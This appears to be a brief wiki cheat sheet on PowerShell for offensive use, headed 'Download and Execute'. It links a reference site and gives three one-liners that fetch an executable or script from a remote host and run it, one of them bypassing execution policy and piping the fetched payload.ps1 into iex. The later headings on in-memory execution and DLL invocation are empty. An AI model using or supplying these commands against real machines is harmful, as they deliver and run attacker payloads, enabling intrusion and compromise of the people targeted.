<!-- TITLE: Powershell -->
<!-- SUBTITLE: A quick summary of Powershell -->

# Download and Execute
Good reference for many ways:  https://www.greyhathacker.net/?p=500

```text
powershell (New-Object System.Net.WebClient).DownloadFile('http://<ip>',c:\temp\test.exe'); (New-Object -com Shell.Application).ShellExecute('c:\temp\test.exe');

PowerShell (New-Object System.Net.WebClient).DownloadFile('http://www.greyhathacker.net/tools/messbox.exe','mess.exe');Start-Process 'mess.exe'

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

```


# Execute in memory

# Invoke DLL functions
